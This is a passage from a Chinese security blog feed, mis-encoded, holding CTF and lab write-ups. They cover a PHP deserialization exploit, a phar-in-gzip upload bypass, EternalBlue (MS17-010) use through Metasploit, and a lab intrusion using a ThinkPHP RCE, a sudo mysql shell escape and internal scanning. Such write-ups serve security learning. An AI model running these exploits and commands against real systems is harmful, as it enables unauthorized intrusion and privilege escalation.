class="variable">$_POST</span>[<span class="string">&quot;ISCTF&quot;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ç‚¹æ˜¯md5(md5($this-&gt;var11)) &#x3D;&#x3D; 666è¿™ä¸ªçš„çˆ†ç ´ï¼Œå› ä¸ºæ˜¯å¼±æ¯”è¾ƒ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># éšæœºç”Ÿæˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼ˆä½ ä¹Ÿå¯ä»¥å›ºå®šä¸€ä¸ªå‰ç¼€ï¼‰</span></span><br><span class="line">    s = <span class="string">&#x27;&#x27;</span>.join(random.choices(string.ascii_letters + string.digits, k=<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line">    h1 = hashlib.md5(s.encode()).hexdigest()</span><br><span class="line">    h2 = hashlib.md5(h1.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> h2.startswith(<span class="string">&quot;666&quot;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;FOUND!&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;var11 =&quot;</span>, s)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;md5(var11) =&quot;</span>, h1)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;md5(md5(var11)) =&quot;</span>, h2)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>è¿™é¢˜çš„expè¿˜åœ¨ï¼Œç©ºæ ¼è¿‡æ»¤ç”¨%09ï¼ˆè®°å¾—æŠŠpayloadé‡Œé¢çš„ç©ºæ ¼æ¢æˆ%09ï¼‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">begin</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eenndd</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$command</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flaag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var10</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var11</span>=<span class="string">&quot;bBiksrJO45&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">begin</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">begin</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">flaag</span>();</span><br><span class="line"><span class="variable">$b</span> -&gt; var2 = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$a</span> -&gt; var1 = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$a</span> -&gt; var2 = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="title function_ invoke__">eenndd</span>();</span><br><span class="line"><span class="variable">$c</span> -&gt; var10 = <span class="variable">$d</span>;</span><br><span class="line"><span class="variable">$d</span> -&gt; command = <span class="string">&quot;var_dump(`head /f*`);&quot;</span>;</span><br><span class="line"><span class="variable">$x</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$x</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç¬¬äºŒç‚¹å°±æ˜¯è¿™é‡Œçš„$bä¹Ÿè¦ç»™var2å»èµ‹å€¼$cï¼Œä¸€å¼€å§‹æ²¡æœ‰å‘ç°ä¸€ç›´æ‰“ä¸é€šï¼Œç„¶åå°±æ²¡å•¥äº†</p><h2 id="include-upload"><a href="#include-upload" class="headerlink" title="include_upload"></a>include_upload</h2><p>é¦–å…ˆæ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ï¼Œfuzzå‘ç°åç¼€åªèƒ½æ˜¯pngï¼Œå†…å®¹é‡Œé¢ä¸èƒ½æœ‰&lt;?å’Œphpï¼ˆå¤§å°å†™éƒ½ä¸è¡Œï¼‰ï¼Œå…¶å®ƒé©¬ä¹Ÿè¯•è¿‡è§£æä¸äº†ï¼Œè¿™é‡Œè€ƒè™‘ç”¨pharæ–‡ä»¶åŒ…å«ï¼Œincludeç”±äºè¦åŒ…å«çš„æ˜¯æ–‡ä»¶å¤´è€Œä¸æ˜¯å‹ç¼©çš„æ–‡ä»¶åŒ…ï¼Œæ‰€ä»¥è¿™é‡Œä¸ç”¨ä¼ªåè®®ä¹Ÿå¯ä»¥æ‰“</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);<span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>) &amp;&amp; <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$file</span>, -<span class="number">4</span>)) == <span class="string">&quot;.png&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span><span class="string">&#x27;./upload/&#x27;</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>basenameåªèƒ½è¿”å›æ–‡ä»¶åéƒ¨åˆ†ï¼Œæ‰€ä»¥ç›®å½•ç©¿è¶Šï¼Œä¼ªåè®®éƒ½ç”¨ä¸äº†</p><p>æˆ‘ä»¬ä½¿ç”¨gzå‹ç¼©ä¸€ä¸‹pharæ–‡ä»¶ï¼Œç»•è¿‡æ–‡ä»¶ä¸Šä¼ çš„è¿‡æ»¤ï¼Œä¹‹åå°±å¯ä»¥åŒ…å«äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ç”Ÿæˆpharæ–‡ä»¶</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hello</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;rufeii&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();     <span class="comment">//å¼€ç¼“å†²</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&lt;?php system(&#x27;tac /f*&#x27;); __HALT_COMPILER();?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$o</span>=<span class="keyword">new</span> <span class="title class_">Hello</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;m.txt&quot;</span>,<span class="string">&quot;aaaa&quot;</span>);  <span class="comment">//å†™å…¥m.php</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();      <span class="comment">//å…³ç¼“å†²</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//gzå‘½ä»¤å‹ç¼©</span></span><br><span class="line">gzip phar.phar</span><br><span class="line">å¾—åˆ°ï¼šphar.phar.gz</span><br></pre></td></tr></table></figure><p>010æ‰“å¼€</p><p><img src="/../images/achieve/2025/12/image-20251209200652209.png" alt="image-20251209200652209"></p><p>ç›´æ¥æ”¹åç¼€ä¸Šä¼ å³å¯ï¼Œincludeçš„åº•å±‚ä¼šå»è§£å‹è¯†åˆ«ï¼ˆ<a href="https://fushuling.com/index.php/2025/07/30/%E5%BD%93include%E9%82%82%E9%80%85phar-deadsecctf2025-baby-web/">å½“includeé‚‚é€…pharâ€”â€”DeadsecCTF2025 baby-web â€“ fushulingã®blog</a>ï¼‰</p>]]></content>
      
      
      <categories>
          
          <category> èµ›é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cve </tag>
            
            <tag> bottleæ–œä½“å­— </tag>
            
            <tag> åŸå‹é“¾æ±¡æŸ“ </tag>
            
            <tag> ssti </tag>
            
            <tag> rce </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>äº†è§£æ°¸æ’ä¹‹è“</title>
      <link href="/2025/12/03/%E4%BA%86%E8%A7%A3%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/"/>
      <url>/2025/12/03/%E4%BA%86%E8%A7%A3%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/</url>
      
        <content type="html"><![CDATA[<h2 id="ä»€ä¹ˆæ˜¯æ°¸æ’ä¹‹è“"><a href="#ä»€ä¹ˆæ˜¯æ°¸æ’ä¹‹è“" class="headerlink" title="ä»€ä¹ˆæ˜¯æ°¸æ’ä¹‹è“"></a>ä»€ä¹ˆæ˜¯æ°¸æ’ä¹‹è“</h2><p>æ°¸æ’ä¹‹è“æ˜¯ä¸€ç§åˆ©ç”¨Windowsç³»ç»Ÿçš„SMBåè®®æ¼æ´æ¥è·å–ç³»ç»Ÿæœ€é«˜æƒé™ï¼Œä»¥æ­¤æ¥æ§åˆ¶è¢«å…¥ä¾µçš„è®¡ç®—æœºçš„å·¥å…·</p><p>ç¼–å·ä¸ºï¼š<strong>MS17-010</strong></p><h2 id="SMBåè®®"><a href="#SMBåè®®" class="headerlink" title="SMBåè®®"></a>SMBåè®®</h2><blockquote><p>SMB é€šä¿¡åè®®ä¸»è¦æ˜¯ä½œä¸º Microsoft ç½‘ç»œçš„é€šè®¯åè®®ã€‚SMB æ˜¯åœ¨ä¼šè¯å±‚ï¼ˆsession layerï¼‰å’Œè¡¨ç¤ºå±‚ï¼ˆpresentation layerï¼‰ä»¥åŠå°éƒ¨åˆ†åº”ç”¨å±‚ï¼ˆapplication layerï¼‰çš„åè®®ã€‚SMB ä½¿ç”¨äº† NetBIOS çš„åº”ç”¨ç¨‹åºæ¥å£ ï¼ˆApplication Program Interfaceï¼Œç®€ç§° APIï¼‰ï¼Œä¸€èˆ¬ç«¯å£ä½¿ç”¨ä¸º 139ï¼Œ445</p><p>åè®®æœåŠ¡å™¨ä¿¡æ¯å—ï¼Œå®ƒæ˜¯ä¸€ç§å®¢æˆ·æœº &#x2F; æœåŠ¡å™¨ã€è¯·æ±‚ &#x2F; å“åº”åè®®ï¼Œé€šè¿‡ SMB åè®®å¯ä»¥åœ¨è®¡ç®—æœºé—´å…±äº«æ–‡ä»¶ã€æ‰“å°æœºã€å‘½åç®¡é“ç­‰èµ„æºï¼Œç”µè„‘ä¸Šçš„ç½‘ä¸Šé‚»å±…å°±æ˜¯é  SMB å®ç°çš„ï¼ŒSMB åè®®å·¥ä½œåœ¨åº”ç”¨å±‚å’Œä¼šè¯å±‚ï¼Œå¯ä»¥ç”¨åœ¨ TCP&#x2F;IP åè®®ä¹‹ä¸Š</p></blockquote><p>ç®€å•æ¥è¯´SMBå°±æ˜¯Windows é‡Œçš„â€œå…±äº«æ–‡ä»¶&#x2F;å…±äº«æ‰“å°æœºâ€çš„åè®®ã€‚ä½ åœ¨å†…ç½‘é‡Œå†…ç½‘é‡Œè®¿é—®åˆ«äººç”µè„‘é‡Œçš„å…±äº«æ–‡ä»¶å¤¹å°±æ˜¯SMBåœ¨å·¥ä½œï¼</p><h2 id="SMBåŸç†"><a href="#SMBåŸç†" class="headerlink" title="SMBåŸç†"></a>SMBåŸç†</h2><blockquote><p>é¦–å…ˆå®¢æˆ·ç«¯å‘é€ä¸€ä¸ª SMB negport è¯·æ±‚æ•°æ®æŠ¥ï¼Œå¹¶åˆ—å‡ºå®ƒæ‰€æ”¯æŒçš„æ‰€æœ‰ SMB çš„åè®®ç‰ˆæœ¬ã€‚</p><p>æœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚æ¶ˆæ¯åå“åº”è¯·æ±‚ï¼Œå¹¶åˆ—å‡ºå¸Œæœ›ä½¿ç”¨çš„ SMB åè®®ç‰ˆæœ¬ã€‚å¦‚æœæ²¡æœ‰å¯ä»¥ä½¿ç”¨çš„åè®®ç‰ˆæœ¬åˆ™è¿”å› 0XFFFFHï¼Œç»“æŸé€šä¿¡ã€‚</p><p>åè®®ç¡®å®šåï¼Œå®¢æˆ·ç«¯è¿›ç¨‹å‘æœåŠ¡å™¨å‘èµ·ä¸€ä¸ªç”¨æˆ·æˆ–å…±äº«çš„è®¤è¯ï¼Œè¿™ä¸ªè¿‡ç¨‹æ˜¯é€šè¿‡å‘é€ SessetupX è¯·æ±‚æ•°æ®åŒ…å®ç°çš„ã€‚</p><p>å®¢æˆ·ç«¯å‘é€ä¸€å¯¹ç”¨æˆ·åå’Œå¯†ç æˆ–ä¸€ä¸ªç®€å•å¯†ç åˆ°æœåŠ¡å™¨ï¼Œç„¶åé€šè¿‡æœåŠ¡å™¨å‘é€ä¸€ä¸ª SessetupX åº”ç­”æ•°æ®åŒ…æ¥å…è®¸æˆ–æ‹’ç»æœ¬æ¬¡è¿æ¥ã€‚</p><p>å½“å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨å®Œæˆäº†ç£‹å•†å’Œè®¤è¯ä¹‹åï¼Œå®ƒä¼šå‘é€ä¸€ä¸ª Tcon æˆ– TconX SMB æ•°æ®æŠ¥å¹¶åˆ—å‡ºå®ƒæƒ³è®¿é—®çš„ç½‘ç»œèµ„æºçš„åç§°ï¼Œä¹‹åä¼šå‘é€ä¸€ä¸ª TconX åº”ç­”æ•°æ®æŠ¥ä»¥è¡¨ç¤ºæ­¤æ¬¡è¿æ¥æ˜¯å¦æ¥æ”¶æˆ–æ‹’ç»ã€‚</p><p>è¿æ¥åˆ°ç›¸åº”èµ„æºåï¼ŒSMB å®¢æˆ·ç«¯å°±èƒ½å¤Ÿé€šè¿‡ open SMB æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ï¼Œé€šè¿‡ read SMB è¯»å–æ–‡ä»¶ï¼Œé€šè¿‡ write SMB å†™å…¥æ–‡ä»¶ï¼Œé€šè¿‡ close SMB å…³é—­æ–‡ä»¶</p></blockquote><p>ç®€å•æ¥è¯´å°±æ˜¯ï¼šç¡®å®šSMBåè®®ç‰ˆæœ¬ â†’ å»ºç«‹è¿æ¥ â†’ å®¢æˆ·ç«¯æ“ä½œæ–‡ä»¶</p><h2 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h2><blockquote><p>SMB æ˜¯ Windows ç³»ç»Ÿä¸­ç”¨äºæ–‡ä»¶å…±äº«ã€æ‰“å°æœåŠ¡çš„ç½‘ç»œåè®®ï¼ŒEternalBlue é’ˆå¯¹çš„æ˜¯ <strong>SMBv1 åè®®æ ˆ</strong>ã€‚</p><p>é—®é¢˜å‡ºåœ¨ <code>Srv.sys</code> å†…æ ¸é©±åŠ¨å¯¹ç‰¹å®š <strong>Trans2 è¯·æ±‚</strong> çš„å¤„ç†ä¸­å­˜åœ¨å†…å­˜é”™è¯¯</p><p>æ”»å‡»è€…ä¼ªé€ ä¸€ä¸ªæ¶æ„ SMB è¯·æ±‚åŒ…ï¼Œä¼ªè£…æˆ <strong>æ–‡ä»¶ä¼ è¾“è¯·æ±‚ï¼ˆTrans2_SESSION_SETUPï¼‰</strong>ï¼Œè¯¥è¯·æ±‚åŒ…å«ç²¾å¿ƒæ„é€ çš„å¤§å°å­—æ®µ</p><blockquote><p>åˆ†é…ä¸€ä¸ªå°ç¼“å†²åŒºï¼ˆæ¯”å¦‚ 1024 å­—èŠ‚ï¼‰ ç„¶åè¯•å›¾å†™å…¥æ¯”å®ƒæ›´å¤§çš„æ•°æ®ï¼ˆæ¯”å¦‚ 4096 å­—èŠ‚ï¼‰</p></blockquote><p>æœ€ç»ˆå¯¼è‡´ <strong>å†…å­˜è¶Šç•Œå†™ï¼ˆHeap Overflowï¼‰</strong></p><p>ç”±äºæ˜¯ <strong>å†…æ ¸æ€é©±åŠ¨</strong>å¤„ç†è¿™ä¸ªè¯·æ±‚ï¼Œæ”»å‡»è€…èƒ½åˆ©ç”¨æº¢å‡ºæ§åˆ¶æŸäº›ç»“æ„ï¼Œæœ€ç»ˆåŠ«æŒæ‰§è¡Œæµï¼ˆæ¯”å¦‚ä¿®æ”¹å‡½æ•°æŒ‡é’ˆï¼‰ï¼Œè¾¾åˆ°ï¼š</p><ul><li>ææƒï¼ˆRing 3 â†’ Ring 0ï¼‰</li><li>æ‰§è¡Œæ¶æ„ shellcode</li><li>æ¤å…¥æœ¨é©¬ &#x2F; åé—¨</li></ul></blockquote><p>ä¸æ‡‚ä¹Ÿæ²¡å…³ç³»ï¼Œäº†è§£åˆ°å®ƒæ˜¯é€šè¿‡å†…å­˜æº¢å‡ºå¯¼è‡´çš„å°±è¡Œäº†ï¼Œå…³é”®æ˜¯ä¼šç”¨</p><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>åœ¨kalié‡Œé¢å»ç”¨msf</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 msfconsole    //è®©å®ƒçš„ç½‘ç»œæµé‡é€šè¿‡ä»£ç†æœåŠ¡å™¨è½¬å‘</span><br><span class="line">use exploit/windows/smb/ms17<span class="built_in">_</span>010<span class="built_in">_</span>eternalblue  //å¯åŠ¨åç›´æ¥é€‰æ‹©æ¼æ´åˆ©ç”¨æ¨¡å—</span><br><span class="line">set payload windows/x64/meterpreter/bind<span class="built_in">_</span>tcp<span class="built_in">_</span>uuid //æ”»å‡»æˆåŠŸåè¦è¿è¡Œçš„ payload</span><br><span class="line">set RHOSTS 172.22.1.21  //è®¾ç½®è¦æ”»å‡»çš„ç›®æ ‡æœºå™¨çš„ ip</span><br><span class="line">exploit   //æ”»å‡»</span><br></pre></td></tr></table></figure><p>ä»£ç†ä¿®æ”¹åœ¨&#x2F;etc&#x2F;proxychains.conf</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[ProxyList]</span><br><span class="line">socks5 ip port</span><br></pre></td></tr></table></figure><p>æ‰“è¿›å»ä¹‹åå°±æ˜¯systemæƒé™äº†</p>]]></content>
      
      
      <categories>
          
          <category> å†…ç½‘æ¸—é€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MS17-010 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ˜¥ç§‹äº‘é•œInitial</title>
      <link href="/2025/12/03/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/"/>
      <url>/2025/12/03/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/</url>
      
        <content type="html"><![CDATA[<h2 id="å¤–ç½‘æ‰“ç‚¹"><a href="#å¤–ç½‘æ‰“ç‚¹" class="headerlink" title="å¤–ç½‘æ‰“ç‚¹"></a>å¤–ç½‘æ‰“ç‚¹</h2><p>è¿›æ¥å‘ç°æ˜¯<code>tp</code>çš„å›¾æ ‡ï¼Œé‚£å°±ç›´æ¥ç”¨å·¥å…·ä¸€æŠŠæ¢­</p><p><img src="/../images/achieve/2025/12/image-20251203104533421.png" alt="image-20251203104533421"></p><p>ç›´æ¥<code>getshell</code>ï¼Œç”¨èšå‰‘è¿æ¥ï¼ç”¨sudoææƒ</p><p><img src="/../images/achieve/2025/12/image-20251203105041702.png" alt="image-20251203105041702"></p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo mysql -e &#x27;<span class="keyword">\!</span> find / -name flag*&#x27;</span><br><span class="line">sudo mysql -e &#x27;<span class="keyword">\!</span> cat /root/flag/f*&#x27;</span><br><span class="line"></span><br><span class="line">è¿™é‡Œæ˜¯æ— å¯†ç çŸ¥é“å¯†ç ä¹Ÿå¯ä»¥ï¼š</span><br><span class="line">mysql -u root -proot -e &quot;<span class="keyword">\!</span> whoami&quot; </span><br></pre></td></tr></table></figure><p><img src="/../images/achieve/2025/12/image-20251203105517955.png" alt="image-20251203105517955"></p><p>æ‹¿åˆ°ç¬¬ä¸€æ®µflagå¼€å§‹æ‰“å†…ç½‘</p><h2 id="å†…ç½‘æ‰“ç‚¹"><a href="#å†…ç½‘æ‰“ç‚¹" class="headerlink" title="å†…ç½‘æ‰“ç‚¹"></a>å†…ç½‘æ‰“ç‚¹</h2><h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><p><code>/tmp</code>ç›®å½•ä¸‹ä¸Šä¼ ä¸€ä¸ª<code>fscan</code>æ–¹ä¾¿æˆ‘ä»¬æ¼æ´æ‰«æï¼Œå¾…ä¼šè¦æ­å»ºéš§é“æ–¹ä¾¿æˆ‘ä»¬æµè§ˆå™¨è®¿é—®å†…ç½‘ï¼Œæ‰€ä»¥ä¸€èµ·ä¸Šä¼ </p><p><img src="/../images/achieve/2025/12/image-20251203110823328.png" alt="image-20251203110823328"></p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ä¾æ¬¡æ‰§è¡Œ</span><br><span class="line">chmod +x fscan</span><br><span class="line">./fscan -h 172.22.1.0/24</span><br><span class="line">cat result.txt</span><br></pre></td></tr></table></figure><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">172.22.1.18:3306 open</span><br><span class="line">172.22.1.18:445 open</span><br><span class="line">172.22.1.2:445 open</span><br><span class="line">172.22.1.21:445 open</span><br><span class="line">172.22.1.18:139 open</span><br><span class="line">172.22.1.2:139 open</span><br><span class="line">172.22.1.21:139 open</span><br><span class="line">172.22.1.18:135 open</span><br><span class="line">172.22.1.21:135 open</span><br><span class="line">172.22.1.2:135 open</span><br><span class="line">172.22.1.18:80 open</span><br><span class="line">172.22.1.15:80 open</span><br><span class="line">172.22.1.15:22 open</span><br><span class="line">172.22.1.2:88 open</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.1.21</span><br><span class="line">   [-&gt;]XIAORANG-WIN7</span><br><span class="line">   [-&gt;]172.22.1.21</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.1.2</span><br><span class="line">   [-&gt;]DC01</span><br><span class="line">   [-&gt;]172.22.1.2</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.1.18</span><br><span class="line">   [-&gt;]XIAORANG-OA01</span><br><span class="line">   [-&gt;]172.22.1.18</span><br><span class="line">[*] OsInfo 172.22.1.2    (Windows Server 2016 Datacenter 14393)</span><br><span class="line">[*] WebTitle http://172.22.1.15        code:200 len:5578   title:Bootstrap Material Admin</span><br><span class="line">[+] MS17-010 172.22.1.21    (Windows Server 2008 R2 Enterprise 7601 Service Pack 1)</span><br><span class="line">[*] NetBios 172.22.1.2      [+] DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393</span><br><span class="line">[*] NetBios 172.22.1.21     XIAORANG-WIN7.xiaorang.lab          Windows Server 2008 R2 Enterprise 7601 Service Pack 1</span><br><span class="line">[*] NetBios 172.22.1.18     XIAORANG-OA01.xiaorang.lab          Windows Server 2012 R2 Datacenter 9600</span><br><span class="line">[*] WebTitle http://172.22.1.18        code:302 len:0      title:None è·³è½¬url: http://172.22.1.18?m=login</span><br><span class="line">[*] WebTitle http://172.22.1.18?m=login code:200 len:4012   title:ä¿¡å‘¼ååŒåŠå…¬ç³»ç»Ÿ</span><br><span class="line">[+] PocScan http://172.22.1.15 poc-yaml-thinkphp5023-method-rce poc1</span><br></pre></td></tr></table></figure><p>æ•´ç†ä¸€ä¸‹ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">172.22.1.2ï¼šDCåŸŸæ§</span><br><span class="line">172.22.1.21ï¼šWindowsçš„æœºå™¨å¹¶ä¸”å­˜åœ¨MS17-010 æ¼æ´</span><br><span class="line">172.22.1.18ï¼šä¿¡å‘¼OAåŠå…¬ç³»ç»Ÿ</span><br></pre></td></tr></table></figure><h3 id="ä¿¡å‘¼ç³»ç»Ÿ"><a href="#ä¿¡å‘¼ç³»ç»Ÿ" class="headerlink" title="ä¿¡å‘¼ç³»ç»Ÿ"></a>ä¿¡å‘¼ç³»ç»Ÿ</h3><p>å…ˆæ‰“ä¿¡å‘¼çš„è¿™ä¸ªç³»ç»Ÿï¼Œå»ºç«‹éš§é“</p><p>æŠŠlinux_x64_agentä¸Šä¼ åˆ°&#x2F;tmpç›®å½•ï¼Œç„¶åæ‰§è¡Œ<code>chmod +x ./linux_x64_agent</code></p><p>æŠŠlinux_x64_adminä¸Šä¼ åˆ°è‡ªå·±çš„vpsä¸Šï¼Œç»™æ‰§è¡Œæƒé™åæ‰§è¡Œï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./linux_x64_admin -l port -s 654321</span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨è¿™å°å·²ç»getshellçš„æœºå™¨ä¸Šè¿è¡Œï¼š</p><figure class="highlight plaintext"><table><tr><td 